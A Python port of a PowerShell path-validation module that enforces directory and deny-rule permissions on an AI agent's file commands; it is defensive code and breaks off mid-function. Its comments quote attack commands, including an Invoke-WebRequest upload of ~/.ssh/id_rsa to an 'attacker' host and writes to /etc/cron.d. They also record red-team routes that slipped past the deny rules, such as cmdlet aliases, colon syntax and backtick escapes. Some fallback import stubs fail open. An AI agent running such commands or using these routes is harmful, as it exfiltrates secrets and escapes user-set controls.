# ------------------------------------------------------------
# pathValidation.py - Phase 1 of 6
# Python conversion of PowerShellTool/pathValidation.ts (lines 1-400)
# 
# PowerShell-specific path validation for AI agent command arguments:
# - Extracts file paths from PowerShell AST parser
# - Validates paths against allowed project directories
# - Security enforcement for AI agent file operations
# - Prevents dangerous system path access
# ------------------------------------------------------------

import os
import re
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple


# ============================================================
# DEFENSIVE IMPORTS
# ============================================================

try:
    from os.path import expanduser
except ImportError:
    def expanduser(path: str) -> str:
        return path

try:
    from pathlib import PurePath
except ImportError:
    PurePath = Path

try:
    from .Tool import ToolPermissionContext
except ImportError:
    ToolPermissionContext = Dict[str, Any]

try:
    from .agent_types.permissions import PermissionRule
except ImportError:
    PermissionRule = Dict[str, Any]

try:
    from .utils.cwd import getCwd
except ImportError:
    def getCwd() -> str:
        return os.getcwd()

try:
    from .utils.fsOperations import getFsImplementation, safeResolvePath
except ImportError:
    def getFsImplementation():
        return None
    
    def safeResolvePath(fs_impl, path: str) -> dict:
        return {'resolvedPath': path, 'isCanonical': False}

try:
    from .utils.path import containsPathTraversal, getDirectoryForPath
except ImportError:
    def containsPathTraversal(path: str) -> bool:
        return '..' in path
    
    def getDirectoryForPath(path: str) -> str:
        return str(Path(path).parent)

try:
    from .utils.permissions.filesystem import (
        allWorkingDirectories,
        checkEditableInternalPath,
        checkPathSafetyForAutoEdit,
        checkReadableInternalPath,
        matchingRuleForInput,
        pathInAllowedWorkingPath,
    )
except ImportError:
    def allWorkingDirectories(context: dict) -> set:
        return set()
    
    def checkEditableInternalPath(path: str, opts: dict) -> dict:
        return {'behavior': 'deny'}
    
    def checkPathSafetyForAutoEdit(path: str, paths: list = None) -> dict:
        return {'safe': True}
    
    def checkReadableInternalPath(path: str, opts: dict) -> dict:
        return {'behavior': 'deny'}
    
    def matchingRuleForInput(path: str, context: dict, perm_type: str, rule_type: str):
        return None
    
    def pathInAllowedWorkingPath(path: str, context: dict, paths: list = None) -> bool:
        return False

try:
    from .utils.permissions.PermissionResult import PermissionResult
except ImportError:
    PermissionResult = Dict[str, Any]

try:
    from .utils.permissions.PermissionUpdate import createReadRuleSuggestion
except ImportError:
    def createReadRuleSuggestion(directory: str, destination: str) -> dict:
        return {
            'type': 'addDirectories',
            'directories': [directory],
            'destination': destination,
        }

try:
    from .utils.permissions.PermissionUpdateSchema import PermissionUpdate
except ImportError:
    PermissionUpdate = Dict[str, Any]

try:
    from .utils.permissions.pathValidation import (
        isDangerousRemovalPath,
        isPathInSandboxWriteAllowlist,
    )
except ImportError:
    def isDangerousRemovalPath(path: str) -> bool:
        return path in ('/', '~', '/etc', '/usr', '/var')
    
    def isPathInSandboxWriteAllowlist(path: str) -> bool:
        return False

try:
    from .utils.platform import getPlatform
except ImportError:
    def getPlatform() -> str:
        import platform
        return platform.system().lower()

try:
    from .utils.powershell.parser import (
        ParsedCommandElement,
        ParsedPowerShellCommand,
        isNullRedirectionTarget,
        isPowerShellParameter,
    )
except ImportError:
    ParsedCommandElement = Dict[str, Any]
    ParsedPowerShellCommand = Dict[str, Any]
    
    def isNullRedirectionTarget(target: str) -> bool:
        return target in ('null', 'nil')
    
    def isPowerShellParameter(arg: str, elem_type: str = None) -> bool:
        return elem_type == 'Parameter'

try:
    from .PowerShellTool.commonParameters import COMMON_SWITCHES, COMMON_VALUE_PARAMS
except ImportError:
    COMMON_SWITCHES = [
        '-verbose', '-debug', '-erroraction', '-warningaction',
        '-informationaction', '-errorvariable', '-warningvariable',
        '-informationvariable', '-outvariable', '-outbuffer',
        '-pipelinevariable',
    ]
    COMMON_VALUE_PARAMS = []

try:
    from .PowerShellTool.readOnlyValidation import resolveToCanonical
except ImportError:
    def resolveToCanonical(name: str) -> str:
        return name.lower()


# ============================================================
# CONSTANTS
# ============================================================

MAX_DIRS_TO_LIST = 5

# PowerShell wildcards are only * ? [ ] — braces are LITERAL characters
# (no brace expansion). Including {} mis-routed paths like `./{x}/passwd`
# through glob-base truncation instead of full-path symlink resolution.
GLOB_PATTERN_REGEX = re.compile(r'[*?\[\]]')

# Element types that are safe to extract as literal path strings.
# Only element types with statically-known string values are safe for path
# extraction. Variable and ExpandableString have runtime-determined values.
SAFE_PATH_ELEMENT_TYPES = {'StringConstant', 'Parameter'}


# ============================================================
# TYPE DEFINITIONS
# ============================================================

FileOperationType = str  # 'read' | 'write' | 'create'

PathCheckResult = Dict[str, Any]
"""
Path check result:
- allowed: Whether path is allowed
- decisionReason: Reason for the decision (optional)
"""

ResolvedPathCheckResult = Dict[str, Any]
"""
Resolved path check result:
- allowed: Whether path is allowed
- resolvedPath: The resolved path
- decisionReason: Reason for the decision (optional)
"""

CmdletPathConfig = Dict[str, Any]
"""
Per-cmdlet parameter configuration:
- operationType: whether this cmdlet reads or writes to the filesystem
- pathParams: parameters that accept file paths (validated against allowed directories)
- knownSwitches: switch parameters (take NO value) — next arg is NOT consumed
- knownValueParams: value-taking parameters that are NOT paths — next arg IS consumed
- leafOnlyPathParams: parameters that accept leaf filenames only (optional)
- positionalSkip: number of leading positional arguments to skip (optional)
- optionalWrite: whether cmdlet only writes when pathParam is present (optional)
"""


# ============================================================
# CMDLET PATH CONFIGURATION (Phase 1 - Write/Create Operations)
# ============================================================

CMDLET_PATH_CONFIG: Dict[str, CmdletPathConfig] = {
    # ─── Write/create operations ──────────────────────────────────────────────
    'set-content': {
        'operationType': 'write',
        # -PSPath and -LP are runtime aliases for -LiteralPath on all provider
        # cmdlets. Without them, colon syntax (-PSPath:/etc/x) falls to the
        # unknown-param branch → path trapped → paths=[] → deny never consulted.
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-passthru',
            '-force',
            '-whatif',
            '-confirm',
            '-usetransaction',
            '-nonewline',
            '-asbytestream',  # PS 6+
        ],
        'knownValueParams': [
            '-value',
            '-filter',
            '-include',
            '-exclude',
            '-credential',
            '-encoding',
            '-stream',
        ],
    },
    'add-content': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-passthru',
            '-force',
            '-whatif',
            '-confirm',
            '-usetransaction',
            '-nonewline',
            '-asbytestream',  # PS 6+
        ],
        'knownValueParams': [
            '-value',
            '-filter',
            '-include',
            '-exclude',
            '-credential',
            '-encoding',
            '-stream',
        ],
    },
    'remove-item': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-recurse',
            '-force',
            '-whatif',
            '-confirm',
            '-usetransaction',
        ],
        'knownValueParams': [
            '-filter',
            '-include',
            '-exclude',
            '-credential',
            '-stream',
        ],
    },
    'clear-content': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-force', '-whatif', '-confirm', '-usetransaction'],
        'knownValueParams': [
            '-filter',
            '-include',
            '-exclude',
            '-credential',
            '-stream',
        ],
    },
    # Out-File/Tee-Object/Export-Csv/Export-Clixml were absent, so path-level
    # deny rules (Edit(/etc/**)) hard-blocked `Set-Content /etc/x` but only
    # *asked* for `Out-File /etc/x`. All four are write cmdlets that accept
    # file paths positionally.
    'out-file': {
        'operationType': 'write',
        # Out-File uses -FilePath (position 0). -Path is PowerShell's documented
        # ALIAS for -FilePath — must be in pathParams or `Out-File -Path:./x`
        # (colon syntax, one token) falls to unknown-param → value trapped →
        # paths=[] → Edit deny never consulted → ask (fail-safe but deny downgrade).
        'pathParams': ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-append',
            '-force',
            '-noclobber',
            '-nonewline',
            '-whatif',
            '-confirm',
        ],
        'knownValueParams': ['-inputobject', '-encoding', '-width'],
    },
    'tee-object': {
        'operationType': 'write',
        # Tee-Object uses -FilePath (position 0, alias: -Path). -Variable NOT a path.
        'pathParams': ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-append'],
        'knownValueParams': ['-inputobject', '-variable', '-encoding'],
    },
    'export-csv': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-append',
            '-force',
            '-noclobber',
            '-notypeinformation',
            '-includetypeinformation',
            '-useculture',
            '-noheader',
            '-whatif',
            '-confirm',
        ],
        'knownValueParams': [
            '-inputobject',
            '-delimiter',
            '-encoding',
            '-quotefields',
            '-usequotes',
        ],
    },
    'export-clixml': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-force', '-noclobber', '-whatif', '-confirm'],
        'knownValueParams': ['-inputobject', '-depth', '-encoding'],
    },
    # New-Item/Copy-Item/Move-Item were missing: `mkdir /etc/cron.d/evil` →
    # resolveToCanonical('mkdir') = 'new-item' via COMMON_ALIASES → not in
    # config → early return {paths:[], 'read'} → Edit deny never consulted.
    #
    # Copy-Item/Move-Item have DUAL path params (-Path source, -Destination
    # dest). operationType:'write' is imperfect — source is semantically a read
    # — but it means BOTH paths get Edit-deny validation, which is strictly
    # safer than extracting neither. A per-param operationType would be ideal
    # but that's a bigger schema change; blunt 'write' closes the gap now.
    'new-item': {
        'operationType': 'write',
        # -Path is position 0. -Name (position 1) is resolved by PowerShell
        # RELATIVE TO -Path (per MS docs: "you can specify the path of the new
        # item in Name"), including `..` traversal. We resolve against CWD
        # (validatePath L930), not -Path — so `New-Item -Path /allowed
        # -Name ../secret/evil` creates /allowed/../secret/evil = /secret/evil,
        # but we resolve cwd/../secret/evil which lands ELSEWHERE and can miss
        # the deny rule. This is a deny→ask downgrade, not fail-safe.
        #
        # -name is in leafOnlyPathParams: simple leaf filenames (`foo.txt`) are
        # extracted (resolves to cwd/foo.txt — slightly wrong, but -Path
        # extraction covers the directory, and a leaf can't traverse);
        # any value with `/`, `\\`, `.`, `..` flags hasUnvalidatablePathArg →
        # ask. Joining -Name against -Path would be correct but needs
        # cross-parameter tracking — out of scope here.
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'leafOnlyPathParams': ['-name'],
        'knownSwitches': ['-force', '-whatif', '-confirm', '-usetransaction'],
        'knownValueParams': ['-itemtype', '-value', '-credential', '-type'],
    },
    'copy-item': {
        'operationType': 'write',
        # -Path (position 0) is source, -Destination (position 1) is dest.
        # Both extracted; both validated as write.
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
        'knownSwitches': [
            '-container',
            '-force',
            '-passthru',
            '-recurse',
            '-whatif',
            '-confirm',
            '-usetransaction',
        ],
        'knownValueParams': [
            '-filter',
            '-include',
            '-exclude',
            '-credential',
            '-fromsession',
            '-tosession',
        ],
    },
    'move-item': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
        'knownSwitches': [
            '-force',
            '-passthru',
            '-whatif',
            '-confirm',
            '-usetransaction',
        ],
        'knownValueParams': ['-filter', '-include', '-exclude', '-credential'],
    },
    # rename-item/set-item: same class — ren/rni/si in COMMON_ALIASES, neither
    # was in config. `ren /etc/passwd passwd.bak` → resolves to rename-item
    # → not in config → {paths:[], 'read'} → Edit deny bypassed. This closes
    # the COMMON_ALIASES→CMDLET_PATH_CONFIG coverage audit: every
    # write-cmdlet alias now resolves to a config entry.
    'rename-item': {
        'operationType': 'write',
        # -Path position 0, -NewName position 1. -NewName is leaf-only (docs:
        # "You cannot specify a new drive or a different path") and Rename-Item
        # explicitly rejects `..` in it — so knownValueParams is correct here,
        # unlike New-Item -Name which accepts traversal.
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-force',
            '-passthru',
            '-whatif',
            '-confirm',
            '-usetransaction',
        ],
        'knownValueParams': [
            '-newname',
            '-credential',
            '-filter',
            '-include',
            '-exclude',
        ],
    },
    'set-item': {
        'operationType': 'write',
        # FileSystem provider throws NotSupportedException for Set-Item content,
        # so the practical write surface is registry/env/function/alias providers.
        # Provider-qualified paths (HKLM:\\, Env:\\) are independently caught at
        # step 3.5 in powershellPermissions.ts, but classifying set-item as write
        # here is defense-in-depth — powershellSecurity.ts:379 already lists it
        # in ENV_WRITE_CMDLETS; this makes pathValidation consistent.
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-force',
            '-passthru',
            '-whatif',
            '-confirm',
            '-usetransaction',
        ],
        'knownValueParams': [
            '-value',
            '-credential',
            '-filter',
            '-include',
            '-exclude',
        ],
    },
    # ─── Read operations ──────────────────────────────────────────────────────
    'get-content': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-force',
            '-usetransaction',
            '-wait',
            '-raw',
            '-asbytestream',  # PS 6+
        ],
        'knownValueParams': [
            '-readcount',
            '-totalcount',
            '-tail',
            '-first',  # alias for -TotalCount
            '-head',  # alias for -TotalCount
            '-last',  # alias for -Tail
            '-filter',
            '-include',
            '-exclude',
            '-credential',
            '-delimiter',
            '-encoding',
            '-stream',
        ],
    },
    'get-childitem': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-recurse',
            '-force',
            '-name',
            '-usetransaction',
            '-followsymlink',
            '-directory',
            '-file',
            '-hidden',
            '-readonly',
            '-system',
        ],
        'knownValueParams': [
            '-filter',
            '-include',
            '-exclude',
            '-depth',
            '-attributes',
            '-credential',
        ],
    },
    'get-item': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-force', '-usetransaction'],
        'knownValueParams': [
            '-filter',
            '-include',
            '-exclude',
            '-credential',
            '-stream',
        ],
    },
    'get-itemproperty': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-usetransaction'],
        'knownValueParams': [
            '-name',
            '-filter',
            '-include',
            '-exclude',
            '-credential',
        ],
    },
    'get-itempropertyvalue': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-usetransaction'],
        'knownValueParams': [
            '-name',
            '-filter',
            '-include',
            '-exclude',
            '-credential',
        ],
    },
    'get-filehash': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [],
        'knownValueParams': ['-algorithm', '-inputstream'],
    },
    'get-acl': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-audit', '-allcentralaccesspolicies', '-usetransaction'],
        'knownValueParams': ['-inputobject', '-filter', '-include', '-exclude'],
    },
    'format-hex': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-raw'],
        'knownValueParams': [
            '-inputobject',
            '-encoding',
            '-count',  # PS 6+
            '-offset',  # PS 6+
        ],
    },
    'test-path': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-isvalid', '-usetransaction'],
        'knownValueParams': [
            '-filter',
            '-include',
            '-exclude',
            '-pathtype',
            '-credential',
            '-olderthan',
            '-newerthan',
        ],
    },
    'resolve-path': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-relative', '-usetransaction', '-force'],
        'knownValueParams': ['-credential', '-relativebasepath'],
    },
    'convert-path': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-usetransaction'],
        'knownValueParams': [],
    },
    'select-string': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-simplematch',
            '-casesensitive',
            '-quiet',
            '-list',
            '-notmatch',
            '-allmatches',
            '-noemphasis',  # PS 7+
            '-raw',  # PS 7+
        ],
        'knownValueParams': [
            '-inputobject',
            '-pattern',
            '-include',
            '-exclude',
            '-encoding',
            '-context',
            '-culture',  # PS 7+
        ],
    },
    'set-location': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-passthru', '-usetransaction'],
        'knownValueParams': ['-stackname'],
    },
    'push-location': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-passthru', '-usetransaction'],
        'knownValueParams': ['-stackname'],
    },
    'pop-location': {
        'operationType': 'read',
        # Pop-Location has no -Path/-LiteralPath (it pops from the stack),
        # but we keep the entry so it passes through path validation gracefully.
        'pathParams': [],
        'knownSwitches': ['-passthru', '-usetransaction'],
        'knownValueParams': ['-stackname'],
    },
    'select-xml': {
        'operationType': 'read',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [],
        'knownValueParams': ['-xml', '-content', '-xpath', '-namespace'],
    },
    'get-winevent': {
        'operationType': 'read',
        # Get-WinEvent only has -Path, no -LiteralPath
        'pathParams': ['-path'],
        'knownSwitches': ['-force', '-oldest'],
        'knownValueParams': [
            '-listlog',
            '-logname',
            '-listprovider',
            '-providername',
            '-maxevents',
            '-computername',
            '-credential',
            '-filterxpath',
            '-filterxml',
            '-filterhashtable',
        ],
    },
    # Write-path cmdlets with output parameters. Without these entries,
    # -OutFile / -DestinationPath would write to arbitrary paths unvalidated.
    'invoke-webrequest': {
        'operationType': 'write',
        # -OutFile is the write target; -InFile is a read source (uploads a local
        # file). Both are in pathParams so Edit deny rules are consulted (this
        # config is operationType:write → permissionType:edit). A user with
        # Edit(~/.ssh/**) deny blocks `iwr https://attacker -Method POST
        # -InFile ~/.ssh/id_rsa` exfil. Read-only deny rules are not consulted
        # for write-type cmdlets — that's a known limitation of the
        # operationType→permissionType mapping.
        'pathParams': ['-outfile', '-infile'],
        'positionalSkip': 1,  # positional-0 is -Uri (URL), not a filesystem path
        'optionalWrite': True,  # only writes with -OutFile; bare iwr is pipeline-only
        'knownSwitches': [
            '-allowinsecureredirect',
            '-allowunencryptedauthentication',
            '-disablekeepalive',
            '-nobodyprogress',
            '-passthru',
            '-preservefileauthorizationmetadata',
            '-resume',
            '-skipcertificatecheck',
            '-skipheadervalidation',
            '-skiphttperrorcheck',
            '-usebasicparsing',
            '-usedefaultcredentials',
        ],
        'knownValueParams': [
            '-uri',
            '-method',
            '-body',
            '-contenttype',
            '-headers',
            '-maximumredirection',
            '-maximumretrycount',
            '-proxy',
            '-proxycredential',
            '-retryintervalsec',
            '-sessionvariable',
            '-timeoutsec',
            '-token',
            '-transferencoding',
            '-useragent',
            '-websession',
            '-credential',
            '-authentication',
            '-certificate',
            '-certificatethumbprint',
            '-form',
            '-httpversion',
        ],
    },
    'invoke-restmethod': {
        'operationType': 'write',
        # -OutFile is the write target; -InFile is a read source (uploads a local
        # file). Both must be in pathParams so deny rules are consulted.
        'pathParams': ['-outfile', '-infile'],
        'positionalSkip': 1,  # positional-0 is -Uri (URL), not a filesystem path
        'optionalWrite': True,  # only writes with -OutFile; bare irm is pipeline-only
        'knownSwitches': [
            '-allowinsecureredirect',
            '-allowunencryptedauthentication',
            '-disablekeepalive',
            '-followrellink',
            '-nobodyprogress',
            '-passthru',
            '-preservefileauthorizationmetadata',
            '-resume',
            '-skipcertificatecheck',
            '-skipheadervalidation',
            '-skiphttperrorcheck',
            '-usebasicparsing',
            '-usedefaultcredentials',
        ],
        'knownValueParams': [
            '-uri',
            '-method',
            '-body',
            '-contenttype',
            '-headers',
            '-maximumfollowrellink',
            '-maximumredirection',
            '-maximumretrycount',
            '-proxy',
            '-proxycredential',
            '-responseheaderstvariable',
            '-retryintervalsec',
            '-sessionvariable',
            '-statuscodevariable',
            '-timeoutsec',
            '-token',
            '-transferencoding',
            '-useragent',
            '-websession',
            '-credential',
            '-authentication',
            '-certificate',
            '-certificatethumbprint',
            '-form',
            '-httpversion',
        ],
    },
    'expand-archive': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
        'knownSwitches': ['-force', '-passthru', '-whatif', '-confirm'],
        'knownValueParams': [],
    },
    'compress-archive': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
        'knownSwitches': ['-force', '-update', '-passthru', '-whatif', '-confirm'],
        'knownValueParams': ['-compressionlevel'],
    },
    # *-ItemProperty cmdlets: primary use is the Registry provider (set/new/
    # remove a registry VALUE under a key). Provider-qualified paths (HKLM:\\,
    # HKCU:\\) are independently caught at step 3.5 in powershellPermissions.ts.
    # Entries here are defense-in-depth for Edit-deny-rule consultation, mirroring
    # set-item's rationale.
    'set-itemproperty': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-passthru',
            '-force',
            '-whatif',
            '-confirm',
            '-usetransaction',
        ],
        'knownValueParams': [
            '-name',
            '-value',
            '-type',
            '-filter',
            '-include',
            '-exclude',
            '-credential',
            '-inputobject',
        ],
    },
    'new-itemproperty': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-force', '-whatif', '-confirm', '-usetransaction'],
        'knownValueParams': [
            '-name',
            '-value',
            '-propertytype',
            '-type',
            '-filter',
            '-include',
            '-exclude',
            '-credential',
        ],
    },
    'remove-itemproperty': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-force', '-whatif', '-confirm', '-usetransaction'],
        'knownValueParams': [
            '-name',
            '-filter',
            '-include',
            '-exclude',
            '-credential',
        ],
    },
    'clear-item': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': ['-force', '-whatif', '-confirm', '-usetransaction'],
        'knownValueParams': ['-filter', '-include', '-exclude', '-credential'],
    },
    'export-alias': {
        'operationType': 'write',
        'pathParams': ['-path', '-literalpath', '-pspath', '-lp'],
        'knownSwitches': [
            '-append',
            '-force',
            '-noclobber',
            '-passthru',
            '-whatif',
            '-confirm',
        ],
        'knownValueParams': ['-name', '-description', '-scope', '-as'],
    },
}


# ============================================================
# HELPER FUNCTIONS
# ============================================================

def matchesParam(paramLower: str, paramList: List[str]) -> bool:
    """
    Checks if a lowercase parameter name (with leading dash) matches any entry
    in the given param list, accounting for PowerShell's prefix-matching behavior
    (e.g., -Lit matches -LiteralPath).
    """
    for p in paramList:
        if p == paramLower or (len(paramLower) > 1 and p.startswith(paramLower)):
            return True
    return False


def hasComplexColonValue(rawValue: str) -> bool:
    """
    Returns true if a colon-syntax value contains expression constructs that
    mask the real runtime path (arrays, subexpressions, variables, backtick
    escapes). The outer CommandParameterAst 'Parameter' element type hides
    these from our AST walk, so we must detect them textually.
    
    Used in three branches of extractPathsFromCommand: pathParams,
    leafOnlyPathParams, and the unknown-param defense-in-depth branch.
    """
    return (
        ',' in rawValue or
        rawValue.startswith('(') or
        rawValue.startswith('[') or
        '`' in rawValue or
        '@(' in rawValue or
        rawValue.startswith('@{') or
        '$' in rawValue
    )


def formatDirectoryList(directories: List[str]) -> str:
    """Format a list of directories for display in messages."""
    dirCount = len(directories)
    if dirCount <= MAX_DIRS_TO_LIST:
        return ', '.join(f"'{dir}'" for dir in directories)
    firstDirs = ', '.join(f"'{dir}'" for dir in directories[:MAX_DIRS_TO_LIST])
    return f"{firstDirs}, and {dirCount - MAX_DIRS_TO_LIST} more"


def expandTilde(filePath: str) -> str:
    """
    Expands tilde (~) at the start of a path to the user's home directory.
    """
    if filePath == '~' or filePath.startswith('~/') or filePath.startswith('~\\'):
        return expanduser('~') + filePath[1:]
    return filePath


def isDangerousRemovalRawPath(filePath: str) -> bool:
    """
    Checks the raw user-provided path (pre-realpath) for dangerous removal
    targets. safeResolvePath/realpathSync canonicalizes in ways that defeat
    isDangerousRemovalPath: on Windows '/' → 'C:\\' (fails the === '/' check);
    on macOS homedir() may be under /var which realpathSync rewrites to
    /private/var (fails the === homedir() check). Checking the tilde-expanded,
    backslash-normalized form catches the dangerous shapes (/, ~, /etc, /usr)
    as the user typed them.
    """
    expanded = expandTilde(re.sub(r"^['\"]|['\"]$", '', filePath)).replace('\\', '/')
    return isDangerousRemovalPath(expanded)


def dangerousRemovalDeny(path: str) -> PermissionResult:
    """Create a deny result for dangerous path removal attempts."""
    return {
        'behavior': 'deny',
        'message': f"Remove-Item on system path '{path}' is blocked. This path is protected from removal.",
        'decisionReason': {
            'type': 'other',
            'reason': 'Removal targets a protected system path',
        },
    }


# ============================================================
# PATH VALIDATION FUNCTIONS (Phase 2)
# ============================================================

def isPathAllowed(
    resolvedPath: str,
    context: ToolPermissionContext,
    operationType: FileOperationType,
    precomputedPathsToCheck: Optional[List[str]] = None,
) -> PathCheckResult:
    """
    Checks if a resolved path is allowed for the given operation type.
    Mirrors the logic in BashTool/pathValidation.ts isPathAllowed.
    """
    permissionType = 'read' if operationType == 'read' else 'edit'

    # 1. Check deny rules first
    denyRule = matchingRuleForInput(
        resolvedPath,
        context,
        permissionType,
        'deny',
    )
    if denyRule is not None:
        return {
            'allowed': False,
            'decisionReason': {'type': 'rule', 'rule': denyRule},
        }

    # 2. For write/create operations, check internal editable paths (plan files, scratchpad, agent memory, job dirs)
    # This MUST come before checkPathSafetyForAutoEdit since .cortex is a dangerous directory
    # and internal editable paths live under ~/.cortex/ — matching the ordering in
    # checkWritePermissionForTool (filesystem.ts step 1.5)
    if operationType != 'read':
        internalEditResult = checkEditableInternalPath(resolvedPath, {})
        if internalEditResult.get('behavior') == 'allow':
            return {
                'allowed': True,
                'decisionReason': internalEditResult.get('decisionReason'),
            }

    # 2.5. For write/create operations, check safety validations
    if operationType != 'read':
        safetyCheck = checkPathSafetyForAutoEdit(
            resolvedPath,
            precomputedPathsToCheck,
        )
        if not safetyCheck.get('safe', True):
            return {
                'allowed': False,
                'decisionReason': {
                    'type': 'safetyCheck',
                    'reason': safetyCheck.get('message'),
                    'classifierApprovable': safetyCheck.get('classifierApprovable'),
                },
            }

    # 3. Check if path is in allowed working directory
    isInWorkingDir = pathInAllowedWorkingPath(
        resolvedPath,
        context,
        precomputedPathsToCheck,
    )
    if isInWorkingDir:
        if operationType == 'read' or context.get('mode') == 'acceptEdits':
            return {'allowed': True}

    # 3.5. For read operations, check internal readable paths
    if operationType == 'read':
        internalReadResult = checkReadableInternalPath(resolvedPath, {})
        if internalReadResult.get('behavior') == 'allow':
            return {
                'allowed': True,
                'decisionReason': internalReadResult.get('decisionReason'),
            }

    # 3.7. For write/create operations to paths OUTSIDE the working directory,
    # check the sandbox write allowlist. When the sandbox is enabled, users
    # have explicitly configured writable directories (e.g. /tmp/claude/) —
    # treat these as additional allowed write directories so redirects/Out-File/
    # New-Item don't prompt unnecessarily. Paths IN the working directory are
    # excluded: the sandbox allowlist always seeds '.' (cwd), which would
    # bypass the acceptEdits gate at step 3.
    if (
        operationType != 'read' and
        not isInWorkingDir and
        isPathInSandboxWriteAllowlist(resolvedPath)
    ):
        return {
            'allowed': True,
            'decisionReason': {
                'type': 'other',
                'reason': 'Path is in sandbox write allowlist',
            },
        }

    # 4. Check allow rules
    allowRule = matchingRuleForInput(
        resolvedPath,
        context,
        permissionType,
        'allow',
    )
    if allowRule is not None:
        return {
            'allowed': True,
            'decisionReason': {'type': 'rule', 'rule': allowRule},
        }

    # 5. Path is not allowed
    return {'allowed': False}


def checkDenyRuleForGuessedPath(
    strippedPath: str,
    cwd: str,
    toolPermissionContext: ToolPermissionContext,
    operationType: FileOperationType,
) -> Optional[Dict[str, Any]]:
    """
    Best-effort deny check for paths obscured by :: or backtick syntax.
    ONLY checks deny rules — never auto-allows. If the stripped guess
    doesn't match a deny rule, we fall through to ask as before.
    """
    # Red-team P7: null bytes make expandPath throw. Pre-existing but
    # defend here since we're introducing a new call path.
    if not strippedPath or '\0' in strippedPath:
        return None
    
    # Red-team P3: `~/.ssh/x strips to ~/.ssh/x but expandTilde only fires
    # on leading ~ — the backtick was in front of it. Re-run here.
    tildeExpanded = expandTilde(strippedPath)
    abs_path = tildeExpanded if os.path.isabs(tildeExpanded) else os.path.join(cwd, tildeExpanded)
    resolvedPath = safeResolvePath(getFsImplementation(), abs_path)['resolvedPath']
    
    permissionType = 'read' if operationType == 'read' else 'edit'
    denyRule = matchingRuleForInput(
        resolvedPath,
        toolPermissionContext,
        permissionType,
        'deny',
    )
    return {'resolvedPath': resolvedPath, 'rule': denyRule} if denyRule else None


def validatePath(
    filePath: str,
    cwd: str,
    toolPermissionContext: ToolPermissionContext,
    operationType: FileOperationType,
) -> ResolvedPathCheckResult:
    """
    Validates a file system path, handling tilde expansion.
    """
    # Remove surrounding quotes if present
    cleanPath = expandTilde(re.sub(r"^['\"]|['\"]$", '', filePath))

    # SECURITY: PowerShell Core normalizes backslashes to forward slashes on all
    # platforms, but path.resolve on Linux/Mac treats them as literal characters.
    # Normalize before resolution so traversal patterns like dir\..\..\etc\shadow
    # are correctly detected.
    normalizedPath = cleanPath.replace('\\', '/')

    # SECURITY: Backtick (`) is PowerShell's escape character. It is a no-op in
    # many positions (e.g., `/ === /) but defeats Node.js path checks like
    # isAbsolute(). Redirection targets use raw .Extent.Text which preserves
    # backtick escapes. Treat any path containing a backtick as unvalidatable.
    if '`' in normalizedPath:
        # Red-team P3: backtick is already resolved for StringConstant args
        # (parser uses .value); this guard primarily fires for redirection
        # targets which use raw .Extent.Text. Strip is a no-op for most special
        # escapes (`n → n) but that's fine — wrong guess → no deny match →
        # falls to ask.
        backtickStripped = normalizedPath.replace('`', '')
        denyHit = checkDenyRuleForGuessedPath(
            backtickStripped,
            cwd,
            toolPermissionContext,
            operationType,
        )
        if denyHit:
            return {
